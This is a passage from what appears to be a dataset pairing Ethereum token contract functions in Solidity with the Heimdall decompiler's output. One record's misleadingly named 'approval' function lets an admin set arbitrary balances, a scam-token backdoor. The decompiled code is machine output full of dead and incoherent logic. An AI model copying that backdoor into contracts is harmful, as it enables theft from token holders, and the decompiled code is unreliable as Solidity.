\"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_h * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_h * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((store_h * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_m) {\n            if (0 - arg1) {\n            }\n            if (0 - arg1) {\n            }\n            require(store_f > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_d) == (address(arg0))) {\n            if (address(store_d) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF332a2A2f2bD6224cC9D8FADCBE8C6Cea3d2a52f", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9e98f34dA0bD240e681c1287eeCfE03d7Ab03546", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function set_New_Router_Address(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_Address(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        uniswapV2Router = (address(arg0) * 0x01) | (uint96(uniswapV2Router));\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function Wallet_Update_Dev(address payable wallet) public onlyOwner() {\r\n        Wallet_Dev = wallet;\r\n        _isExcludedFromFee[Wallet_Dev] = true;\r\n    }", "heimdall_decompiled_code": "function Wallet_Update_Dev(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        noBlackList = (address(arg0) * 0x0100) | (uint96(noBlackList));\n        address var_f = address(noBlackList / 0x0100);\n        var_g = 0x03;\n        storage_map_p[var_f] = (0x01 * 0x01) | (uint248(storage_map_p[var_f]));\n    }"}
{"contract_address": "0xfC37E6b475e0522fc5B8FBc319dB80a4555B5AeD", "original_solidity_code": "function withdrawBalance() public onlyAdmin {\\n        require(address(this).balance > 0, \\\"No balance to withdraw.\\\");\\n        uint256 amount = address(this).balance;\\n        payable(admin).transfer(amount);\\n        emit BalanceWithdrawn(amount);\\n    }", "heimdall_decompiled_code": "function withdrawBalance() public {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(address(this).balance > 0, \"No balance to withdraw.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x4e6f2062616c616e636520746f2077697468647261772e000000000000000000;\n        (bool success, bytes memory ret0) = address(admin).transfer(address(this).balance);\n        uint256 var_a = address(this).balance;\n        emit BalanceWithdrawn(address(this).balance);\n    }"}
{"contract_address": "0x634190EAD9c756794D33e5C4F052774Ab41EB189", "original_solidity_code": "function removeLimits() external onlyOwner{\\r\\n        _maxTxAmount = _tTotal;\\r\\n        _maxWalletSize=_tTotal;\\r\\n        transferDelayEnabled=false;\\r\\n        emit MaxTxAmountUpdated(_tTotal);\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xE017C8475A6C89f181CA2C9222c2Bbf36dc04A4D", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        \r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            msg.sender,\r\n            spender,\r\n            _allowances[msg.sender][spender].sub(\r\n                subtractedValue,\r\n                \"ERC20: decreased allowance below zero\"\r\n            )\r\n        );\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[4467:4504];\n        address var_d = address(msg.sender);\n        var_e = 0x01;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_d[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_a) + 0x20) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        uint256 var_i = 0;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x01;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_d[var_d] = storage_map_d[var_d] - arg1;\n        address var_f = storage_map_d[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_d[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_a) + 0x20) - (0x04 + var_a);\n        var_h = 0x22;\n        var_j = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_k = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_a) + 0x20) - (0x04 + var_a);\n        var_h = 0x24;\n        var_j = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_k = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {\r\n        _swapTokensAtAmount = swapTokensAtAmount;\r\n    }", "heimdall_decompiled_code": "function setMinSwapTokensThreshold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _swapTokensAtAmount = arg0;\n    }"}
{"contract_address": "0x2196c73Bee850827528bf2e164c33441834dFe03", "original_solidity_code": "function getApproved(uint256 tokenId) public view virtual override returns (address) {\r\n        if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();\r\n\r\n        return _tokenApprovals[tokenId].value;\r\n    }", "heimdall_decompiled_code": "function getApproved(uint256 arg0) public view returns (address) {\n        require(!(!0x01 > arg0), CustomError_cf4700e4());\n        require(!(arg0 < totalSupply), CustomError_cf4700e4());\n        uint256 var_a = arg0;\n        var_b = 0x04;\n        require(!(bytes1(storage_map_b[var_a])), CustomError_cf4700e4());\n        var_c = 0xcf4700e400000000000000000000000000000000000000000000000000000000;\n        var_a = arg0;\n        var_b = 0x06;\n        uint256 var_c = address(storage_map_b[var_a]);\n        return address(storage_map_b[var_a]);\n        require(arg0 < totalSupply, CustomError_cf4700e4());\n        var_a = arg0;\n        var_b = 0x06;\n        var_c = address(storage_map_b[var_a]);\n        return address(storage_map_b[var_a]);\n        var_c = 0xcf4700e400000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x3f91B8467d1eE998DE6344903e2fDEB6252d4c8b", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function updateBuyFees(\r\n        uint256 _marketingFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _devFee\r\n    ) external onlyOwner {\r\n        buyMarketingFee = _marketingFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyDevFee = _devFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;\r\n        require(buyTotalFees <= 39, \"Must keep fees at 35% or less\");\r\n    }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        lastLpBurnTimee = arg0;\n        buyLiquidityFee = arg1;\n        buyDevFee = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x20ad88B64104B4E9B3915aAB9c3bfb4E4121622f", "original_solidity_code": "function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {\r\n        buyMarketingFee = _marketingFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyDevFee = _devFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;\r\n        require(buyTotalFees <= 35, \"Must keep fees at 20% or less\");\r\n    }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        lastLpBurnTimee = arg0;\n        buyLiquidityFee = arg1;\n        buyDevFee = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a", "original_solidity_code": "function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (store_c - ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x68;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function updatePebbleDevLevySecureCache(address newWallet) external onlyOwner {\\r\\n        emit PebbleDevLevySecureCacheUpdated(newWallet, PebbleDevLevySecureCache);\\r\\n        PebbleDevLevySecureCache = newWallet;\\r\\n    }", "heimdall_decompiled_code": "function updatePebbleDevLevySecureCache(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit PebbleDevLevySecureCacheUpdated(address(arg0), address(PebbleDevLevySecureCache / 0x01));\n        PebbleDevLevySecureCache = (address(arg0) * 0x01) | (uint96(PebbleDevLevySecureCache));\n    }"}
{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function authorize(address adr) public onlyOwner {\r\n        authorizations[adr] = true;\r\n    }", "heimdall_decompiled_code": "function authorize(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x01;\n        storage_map_s[var_e] = var_f | (uint248(storage_map_s[var_e]));\n    }"}
{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0x90bd0470eeFf15E5A6AC0D7221A4FFB0Eb6C690A", "original_solidity_code": "function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }", "heimdall_decompiled_code": "function renounceownership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit ownershipTransferred(address(owner), 0xdead);\n        owner = 0xdead | (uint96(owner));\n    }"}
{"contract_address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19", "original_solidity_code": "function approval(address spender, uint256 addedValue) public returns (bool) {\r\n \r\n        require(msg.sender == _adm);\r\n \r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n \r\n        canSale[spender]=true;\r\n \r\n        return true;\r\n \r\n    }", "heimdall_decompiled_code": "function approval(address arg0, uint256 arg1) public returns (bool) {\n        require(address(msg.sender) == (address(_adm / 0x01)));\n        require(!arg1 > 0);\n        address var_a = address(arg0);\n        var_b = 0x06;\n        storage_map_c[var_a] = arg1 * 0x0de0b6b3a7640000;\n        var_a = address(arg0);\n        var_b = 0x01;\n        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));\n        var_c = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x01;\n        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x3B528BA581ff9f40A13964383470c43062F9857D", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_d) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_e)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_h * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_h * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!(((store_h * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_h * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_h * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_h * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_h * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = 